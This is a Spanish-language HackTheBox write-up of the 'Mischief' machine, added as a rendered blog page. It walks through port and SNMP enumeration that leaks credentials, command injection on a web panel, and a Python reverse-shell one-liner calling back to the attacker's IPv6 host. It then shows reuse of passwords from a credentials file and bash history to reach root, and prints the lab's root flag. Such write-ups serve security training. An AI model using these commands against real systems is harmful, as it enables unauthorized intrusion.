@@ -1,0 +1,868 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>            Mischeif HackTheBox - Blog Ciberseguridad      Writeups      </title>
+<meta name="description" content="Buenas a todos, en esta ocasión resolveremos una máquina Linux llamada “Mischief” la cual está catalogada como insane en la plataforma de HackTheBox.">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_Arg">
+<meta property="og:site_name" content="Blog Ciberseguridad | Writeups">
+<meta property="og:title" content="Mischeif HackTheBox">
+<meta property="og:url" content="http://localhost:4000/writeup-Mischeif/">
+
+
+  <meta property="og:description" content="Buenas a todos, en esta ocasión resolveremos una máquina Linux llamada “Mischief” la cual está catalogada como insane en la plataforma de HackTheBox.">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/htb-writeup-Mischief/icono.jpg">
+
+
+
+
+
+  <meta property="article:published_time" content="2023-11-10T00:00:00+00:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/writeup-Mischeif/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "Vo1dN3t",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Blog Ciberseguridad | Writeups Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/" alt=""></a>
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >About</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Mischeif HackTheBox</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/perfil2.jpg" alt="Vo1dN3t" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Vo1dN3t</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Entusiasta del Hacking y CTFs<br>Ethical Hacker | RedTeam
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Argentina</span>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/Voidnet01" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Mischeif HackTheBox">
+    <meta itemprop="description" content="Buenas a todos, en esta ocasión resolveremos una máquina Linux llamada “Mischief” la cual está catalogada como insane en la plataforma de HackTheBox.">
+    <meta itemprop="datePublished" content="November 10, 2023">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Mischeif HackTheBox
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2023-11-10T00:00:00+00:00">November 10, 2023 </time>&emsp;
+          
+          
+        </p>
+        <p>Buenas a todos, en esta ocasión resolveremos una máquina Linux llamada “Mischief” la cual está catalogada como insane en la plataforma de HackTheBox.</p>
+
+<p><img src="/assets/images/htb-writeup-Mischief/mischief.png" alt="" /></p>
+
+<hr />
+
+<p>Primero empezamos a escanear con Nmap para ver que puertos tiene abiertos.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+❯ nmap <span class="nt">-sS</span> <span class="nt">-Pn</span> <span class="nt">-vvv</span> <span class="nt">--min-rate</span> 5000 <span class="nt">--open</span> <span class="nt">-p-</span> <span class="nt">-n</span> 10.10.10.92 <span class="nt">-oG</span> allports
+Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-11-10 20:31 GMT
+Initiating SYN Stealth Scan at 20:31
+Scanning 10.10.10.92 <span class="o">[</span>65535 ports]
+Discovered open port 22/tcp on 10.10.10.92
+Stats: 0:00:15 elapsed<span class="p">;</span> 0 hosts completed <span class="o">(</span>1 up<span class="o">)</span>, 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 57.46% <span class="k">done</span><span class="p">;</span> ETC: 20:31 <span class="o">(</span>0:00:12 remaining<span class="o">)</span>
+Discovered open port 3366/tcp on 10.10.10.92
+Completed SYN Stealth Scan at 20:31, 26.54s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
+Nmap scan report <span class="k">for </span>10.10.10.92
+Host is up, received user-set <span class="o">(</span>0.25s latency<span class="o">)</span><span class="nb">.</span>
+Scanned at 2023-11-10 20:31:19 GMT <span class="k">for </span>27s
+Not shown: 65533 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
+PORT     STATE SERVICE        REASON
+22/tcp   open  ssh            syn-ack ttl 63
+3366/tcp open  creativepartnr syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>26.65 seconds
+           Raw packets sent: 131085 <span class="o">(</span>5.768MB<span class="o">)</span> | Rcvd: 19 <span class="o">(</span>836B<span class="o">)</span>
+
+</code></pre></div></div>
+<p>Sigamos con el escaneo de puertos.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+❯ nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,3366 10.10.10.92 <span class="nt">-oN</span> targeted
+Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-11-10 20:35 GMT
+Nmap scan report <span class="k">for </span>10.10.10.92
+Host is up <span class="o">(</span>0.25s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 2a:90:a6:b1:e6:33:85:07:15:b2:ee:a7:b9:46:77:52 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 d0:d7:00:7c:3b:b0:a6:32:b2:29:17:8d:69:a6:84:3f <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 3f:1c:77:93:5c:c0:6c:ea:26:f4:bb:6c:59:e9:7c:b0 <span class="o">(</span>ED25519<span class="o">)</span>
+3366/tcp open  caldav  Radicale calendar and contacts server <span class="o">(</span>Python BaseHTTPServer<span class="o">)</span>
+|_http-server-header: SimpleHTTP/0.6 Python/2.7.15rc1
+| http-auth: 
+| HTTP/1.0 401 Unauthorized<span class="se">\x</span>0D
+|_  Basic <span class="nv">realm</span><span class="o">=</span>Test
+|_http-title: Site doesn<span class="s1">'t have a title (text/html).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 33.85 seconds
+</span></code></pre></div></div>
+<p>Si miramos bien, en el puerto 3366 nos llevará a una página que nos pedirá unas credenciales:</p>
+
+<p><img src="/assets/images/htb-writeup-Mischief/puerto3366.jpg" alt="" /></p>
+
+<p>Si lanzamos un curl podemos ver que en la web corre un SimpleHTTPServer usando la versión de Python 2.7.15rc1</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+❯ curl <span class="nt">-s</span> <span class="nt">-X</span> GET <span class="s2">"http://10.10.10.92:3366"</span> <span class="nt">-I</span>
+HTTP/1.0 401 Unauthorized
+Server: SimpleHTTP/0.6 Python/2.7.15rc1
+Date: Fri, 10 Nov 2023 20:49:20 GMT
+WWW-Authenticate: Basic <span class="nv">realm</span><span class="o">=</span><span class="s2">"Test"</span>
+Content-type: text/html
+
+</code></pre></div></div>
+<p>Otra forma de ver la versión del servidor es tirando del WhatWeb.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+❯ whatweb http://10.10.10.92:3366
+http://10.10.10.92:3366 <span class="o">[</span>401 Unauthorized] Country[RESERVED][ZZ], HTTPServer[SimpleHTTP/0.6 Python/2.7.15rc1], IP[10.10.10.92], Python[2.7.15rc1], WWW-Authenticate[Test][Basic]
+
+</code></pre></div></div>
+<p>Ya que no tenemos más puertos para enumerar lo que podemos hacer es lanzar un escaneo con Nmap por UDP.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+❯ nmap <span class="nt">-sU</span> <span class="nt">--top-ports</span> 500 <span class="nt">-v</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.10.92
+Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>may be slower.
+Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-11-10 20:55 GMT
+Initiating UDP Scan at 20:55
+Scanning 10.10.10.92 <span class="o">[</span>500 ports]
+UDP Scan Timing: About 31.00% <span class="k">done</span><span class="p">;</span> ETC: 20:57 <span class="o">(</span>0:01:09 remaining<span class="o">)</span>
+Discovered open port 161/udp on 10.10.10.92
+Completed UDP Scan at 20:56, 45.77s elapsed <span class="o">(</span>500 total ports<span class="o">)</span>
+Nmap scan report <span class="k">for </span>10.10.10.92
+Host is up <span class="o">(</span>0.26s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 499 open|filtered udp ports <span class="o">(</span>no-response<span class="o">)</span>
+PORT    STATE SERVICE
+161/udp open  snmp
+
+Read data files from: /usr/bin/../share/nmap
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>45.84 seconds
+           Raw packets sent: 1090 <span class="o">(</span>54.446KB<span class="o">)</span> | Rcvd: 11 <span class="o">(</span>1.174KB<span class="o">)</span>
+
+</code></pre></div></div>
+
+<p>Vemos que el puerto 161 corre un servicio bastante interesante y es el servicio snmp.</p>
+
+<p>Podemos usar snmpwalk para tener más información de la máquina, pero antes de enumerar necesitamos saber la community string, para esto podemos usar la herramienta onesixtione.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ onesixtyone <span class="nt">-c</span> /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt 10.10.10.92
+Scanning 1 hosts, 3218 communities
+10.10.10.92 <span class="o">[</span>public] Linux Mischief 4.15.0-20-generic <span class="c">#21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64</span>
+10.10.10.92 <span class="o">[</span>public] Linux Mischief 4.15.0-20-generic <span class="c">#21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64</span>
+</code></pre></div></div>
+<p>Tenemos la comunnity string y es public, ahora usemos snmpwalk para enumerar información del equipo.</p>
+
+<p>Recordemos que podemos enumerar procesos, si volvemos a ver en el escaneo que hicimos con Nmap nos muestra que la web por el puerto 3366 corre por un servidor en Python.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ snmpwalk <span class="nt">-v</span> 2c <span class="nt">-c</span> public 10.10.10.92 hrSWRunName | <span class="nb">grep </span>python
+HOST-RESOURCES-MIB::hrSWRunName.772 <span class="o">=</span> STRING: <span class="s2">"python"</span>
+
+</code></pre></div></div>
+
+<p>Para tener más información de ese proceso que acabamos de encontrar debemos hacer un grep a “772”.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+❯ snmpwalk <span class="nt">-v</span> 2c <span class="nt">-c</span> public 10.10.10.92 hrSWRunTable | <span class="nb">grep</span> <span class="s2">"772"</span>
+HOST-RESOURCES-MIB::hrSWRunIndex.772 <span class="o">=</span> INTEGER: 772
+HOST-RESOURCES-MIB::hrSWRunName.772 <span class="o">=</span> STRING: <span class="s2">"python"</span>
+HOST-RESOURCES-MIB::hrSWRunID.772 <span class="o">=</span> OID: SNMPv2-SMI::zeroDotZero
+HOST-RESOURCES-MIB::hrSWRunPath.772 <span class="o">=</span> STRING: <span class="s2">"python"</span>
+HOST-RESOURCES-MIB::hrSWRunParameters.772 <span class="o">=</span> STRING: <span class="s2">"-m SimpleHTTPAuthServer 3366 loki:godofmischiefisloki --dir /home/loki/hosted/"</span> &lt;<span class="nt">--</span>
+HOST-RESOURCES-MIB::hrSWRunType.772 <span class="o">=</span> INTEGER: application<span class="o">(</span>4<span class="o">)</span>
+HOST-RESOURCES-MIB::hrSWRunStatus.772 <span class="o">=</span> INTEGER: runnable<span class="o">(</span>2<span class="o">)</span>
+</code></pre></div></div>
+<p>Tenemos las credenciales de un usuario llamado Loki, intentemos usar esas credenciales para acceder a la web.</p>
+
+<p><img src="/assets/images/htb-writeup-Mischief/web.jpg" alt="" /></p>
+
+<p>Hay más credenciales, podemos guardarlas en un fichero .txt</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+loki:godofmischiefisloki
+loki:trickeryanddeceit
+
+</code></pre></div></div>
+<p>Con snmpwalk podemos usar el mib de ipAddressType para ver todas las interfaces de red de la máquina, incluyendo la Ipv6.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+❯ snmpwalk <span class="nt">-v2c</span> <span class="nt">-c</span> public 10.10.10.92 ipAddressType
+IP-MIB::ipAddressType.ipv4.<span class="s2">"10.10.10.92"</span> <span class="o">=</span> INTEGER: unicast<span class="o">(</span>1<span class="o">)</span>
+IP-MIB::ipAddressType.ipv4.<span class="s2">"10.10.10.255"</span> <span class="o">=</span> INTEGER: broadcast<span class="o">(</span>3<span class="o">)</span>
+IP-MIB::ipAddressType.ipv4.<span class="s2">"127.0.0.1"</span> <span class="o">=</span> INTEGER: unicast<span class="o">(</span>1<span class="o">)</span>
+IP-MIB::ipAddressType.ipv6.<span class="s2">"00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:01"</span> <span class="o">=</span> INTEGER: unicast<span class="o">(</span>1<span class="o">)</span>
+IP-MIB::ipAddressType.ipv6.<span class="s2">"de:ad:be:ef:00:00:00:00:02:50:56:ff:fe:b9:e3:a2"</span> <span class="o">=</span> INTEGER: unicast<span class="o">(</span>1<span class="o">)</span>
+IP-MIB::ipAddressType.ipv6.<span class="s2">"fe:80:00:00:00:00:00:00:02:50:56:ff:fe:b9:e3:a2"</span> <span class="o">=</span> INTEGER: unicast<span class="o">(</span>1<span class="o">)</span>
+</code></pre></div></div>
+<p>Ahora debemos quitar los ‘:’ extras cada dos carácteres para obtener la dirección Ipv6 real.</p>
+
+<p>Quedaría algo asi:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+dead:beef::0250:56ff:feb9:e3a2
+
+</code></pre></div></div>
+<p>Recuerden que es opcional sacarles los ceros.</p>
+
+<p>Escaneamos esa dirección Ipv6 para ver si tiene algun puerto abierto.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+❯ nmap <span class="nt">-6</span>  <span class="nt">-Pn</span> <span class="nt">-n</span> dead:beef::0250:56ff:feb9:e3a2
+Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-11-10 22:13 GMT
+Nmap scan report <span class="k">for </span>dead:beef::250:56ff:feb9:e3a2
+Host is up <span class="o">(</span>0.26s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 998 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>3.20 seconds
+
+</code></pre></div></div>
+
+<p>Nos reportó que el puerto 80 está abierto, ahora debemos colocar la dirección Ipv6 en el /etc/host.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo "dead:beef::0250:56ff:feb9:e3a2 mischief.htb" | sudo tee -a /etc/hosts  
+
+</code></pre></div></div>
+
+<p>Accedamos a la web.</p>
+
+<p><img src="/assets/images/htb-writeup-Mischief/login.jpg" alt="" /></p>
+
+<p>Si nos fijamos bien nos muestra un login.</p>
+
+<p>Luego de varios intentos, pude acceder con estas credenciales:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>username=Administrator
+password=trickeryanddeceit
+
+</code></pre></div></div>
+<p>Una vez dentro vemos que podemos ejecutar comandos.</p>
+
+<p><img src="/assets/images/htb-writeup-Mischief/command.jpg" alt="" /></p>
+
+<hr />
+
+<h2 id="shell-como-www-data">Shell como WWW-DATA</h2>
+
+<p>En el output al enviar un ‘;’ nos muestra el comando ejecutado.</p>
+
+<p><img src="/assets/images/htb-writeup-Mischief/command2.jpg" alt="" /></p>
+
+<p>Al ejecutar un “whoami;” podemos ver al usuario “www-data”</p>
+
+<p>Para ganar acceso como “www-data” yo voy a utilizar un script en Python, en el script tiene que cambiar AF_INET a AF_INET6 y en la dirección IP no tiene que poner la IPv4 tiene que poner su dirección IPv6</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::1018",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span>
+
+</code></pre></div></div>
+
+<p>Nos ponemos en escucha por ncat.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+❯ ncat <span class="nt">-6lvnp</span> 443 <span class="nt">--listen</span> dead:beef:2::1018
+Ncat: Version 7.94SVN <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
+Ncat: Listening on <span class="o">[</span>dead:beef:2::1018]:443
+
+</code></pre></div></div>
+<p>Ejecutemos el script en Python en la pagina web.</p>
+
+<p><img src="/assets/images/htb-writeup-Mischief/command3.jpg" alt="" /></p>
+
+<p>Regresemos al ncat y vemos que ganamos acceso.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+❯ ncat <span class="nt">-6lvnp</span> 443 <span class="nt">--listen</span> dead:beef:2::1018
+Ncat: Version 7.94SVN <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
+Ncat: Listening on <span class="o">[</span>dead:beef:2::1018]:443
+Ncat: Connection from <span class="o">[</span>dead:beef::250:56ff:feb9:e3a2]:53256.
+/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
+$ script /dev/null -c bash
+Script started, file is /dev/null
+www-data@Mischief:/var/www/html$ ifconfig
+ifconfig
+ens33: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        inet 10.10.10.92  netmask 255.255.255.0  broadcast 10.10.10.255
+        inet6 dead:beef::250:56ff:feb9:e3a2  prefixlen 64  scopeid 0x0&lt;global&gt;
+        inet6 fe80::250:56ff:feb9:e3a2  prefixlen 64  scopeid 0x20&lt;link&gt;
+        ether 00:50:56:b9:e3:a2  txqueuelen 1000  (Ethernet)
+        RX packets 154210  bytes 9724905 (9.7 MB)
+        RX errors 0  dropped 90  overruns 0  frame 0
+        TX packets 15844  bytes 2464571 (2.4 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 0  bytes 0 (0.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 0  bytes 0 (0.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+www-data@Mischief:/var/www/html$
+ 
+</span></code></pre></div></div>
+<p>Ahora para movernos por la terminal más comodos hagamos un tratamiento de la TTY.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>export TERM=xterm
+export SHELL=bash
+
+Ctrl + z
+
+stty raw -echo; fg
+
+reset xterm
+
+</code></pre></div></div>
+<p>Luego de un rato enumerando en el directorio /home/loki encontre un archivo llamado “credentials”, que
+dentro se encuentran las credenciales de Loki para poder conectarnos por ssh.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@Mischief:/home/loki$ ls
+credentials  hosted  user.txt
+www-data@Mischief:/home/loki$ cat credentials 
+pass: lokiisthebestnorsegod
+www-data@Mischief:/home/loki$ 
+</code></pre></div></div>
+<p>Nos conectamos por ssh y una vez dentro ya podemos leer la primera flag.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ sudo ssh loki@10.10.10.92
+[sudo] password for void: 
+loki@10.10.10.92's password: 
+Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Fri Nov 10 23:26:18 UTC 2023
+
+  System load:  0.0               Processes:            167
+  Usage of /:   61.5% of 6.83GB   Users logged in:      0
+  Memory usage: 36%               IP address for ens33: 10.10.10.92
+  Swap usage:   0%
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+0 packages can be updated.
+0 updates are security updates.
+
+
+Last login: Sat Jul 14 12:44:04 2018 from 10.10.14.4
+loki@Mischief:~$ ls
+credentials  hosted  user.txt
+loki@Mischief:~$ cat user.txt 
+bf5***************************60
+loki@Mischief:~$
+ 
+</code></pre></div></div>
+<hr />
+<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>
+
+<p>Listamos el “history” para ver que comandos ejecutó el usuario Loki.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+loki@Mischief:~<span class="nv">$ </span><span class="nb">history
+    </span>1  python <span class="nt">-m</span> SimpleHTTPAuthServer loki:lokipasswordmischieftrickery &lt;<span class="nt">--</span>
+    2  <span class="nb">exit
+    </span>3  free <span class="nt">-mt</span>
+    4  ifconfig
+    5  <span class="nb">cd</span> /etc/
+    6  <span class="nb">sudo </span>su
+    7  su
+    8  <span class="nb">exit
+    </span>9  su root
+   10  <span class="nb">ls</span> <span class="nt">-la</span>
+   11  <span class="nb">sudo</span> <span class="nt">-l</span>
+   12  ifconfig
+   13  <span class="nb">id
+   </span>14  <span class="nb">cat</span> .bash_history 
+   15  nano .bash_history 
+   16  <span class="nb">exit
+   </span>17  <span class="nb">ls
+   </span>18  <span class="nb">cat </span>user.txt 
+   19  <span class="nb">sudo </span>su
+   20  <span class="nb">sudo</span> <span class="nt">-l</span>
+   21  hostiry
+   22  <span class="nb">history
+</span>loki@Mischief:~<span class="nv">$ </span>
+
+</code></pre></div></div>
+<p>Intentemos usar esas credenciales para convertirnos en Root.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>loki@Mischief:~<span class="nv">$ </span>su
+bash: /bin/su: Permission denied
+loki@Mischief:~<span class="nv">$ </span><span class="nb">sudo </span>su
+bash: /usr/bin/sudo: Permission denied
+loki@Mischief:~<span class="nv">$ </span>
+
+</code></pre></div></div>
+<p>Vemos que no nos deja usar “SU” o “SUDO SU”.</p>
+
+<p>Para listar mejor los privilegios podemos usar getfacl.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+loki@Mischief:~<span class="nv">$ </span>getfacl /bin/su 
+getfacl: Removing leading <span class="s1">'/'</span> from absolute path names
+<span class="c"># file: bin/su</span>
+<span class="c"># owner: root</span>
+<span class="c"># group: root</span>
+<span class="c"># flags: s--</span>
+user::rwx
+user:loki:r--
+group::r-x
+mask::r-x
+other::r-x
+
+loki@Mischief:~<span class="nv">$ </span>getfacl /bin/su 
+getfacl: Removing leading <span class="s1">'/'</span> from absolute path names
+<span class="c"># file: bin/su</span>
+<span class="c"># owner: root</span>
+<span class="c"># group: root</span>
+<span class="c"># flags: s--</span>
+user::rwx
+user:loki:r--
+group::r-
+mask::r-x
+other::r-x
+</code></pre></div></div>
+<p>Pueden ver que en “user:loki:r–” tiene capacidad de lectura pero no de ejecución, aunque para otros
+tienen capacidad lectura y de ejecución.</p>
+
+<p>Volvamos a la shell “www-data” e intentemos escalar los privilegios ahí utilizando el comando “SU” y 
+la contraseña “lokipasswordmischieftrickery”.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+www-data@Mischief:/<span class="nv">$ </span>su
+Password: lokipasswordmischieftrickery
+root@Mischief:/#
+
+</code></pre></div></div>
+<p>Pudimos escalar los privilegios, ahora nos dirigimos al directorio /root para visualizar la segunda flag.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+root@Mischief:~# <span class="nb">cat </span>root.txt 
+<span class="nb">cat </span>root.txt
+The flag is not here, get a shell to find it!
+root@Mischief:~# 
+</code></pre></div></div>
+<p>Pero vemos que nos dice que la falg no se encuentra ahí y que debemos encontrarla.</p>
+
+<p>Busquemos archivos que llamen root.txt con find.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+root@Mischief:/# find <span class="se">\-</span>name root.txt 2&gt;/dev/null
+./usr/lib/gcc/x86_64-linux-gnu/7/root.txt
+./root/root.txt
+root@Mischief:/# 
+
+</code></pre></div></div>
+
+<p>Nos muestra una ruta donde podria estar la verdadera flag de root, veamos si se encuentra haciéndole un cat a la ruta del archivo.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+root@Mischief:/# <span class="nb">cat</span> ./usr/lib/gcc/x86_64-linux-gnu/7/root.txt
+ae155fad479c56f912c65d7be4487807
+root@Mischief:/# 
+</code></pre></div></div>
+<p>Tenemos la segunda flag.</p>
+
+<p>Espero que se haya entendido.</p>
+
+<p>Gracias por leer :)</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
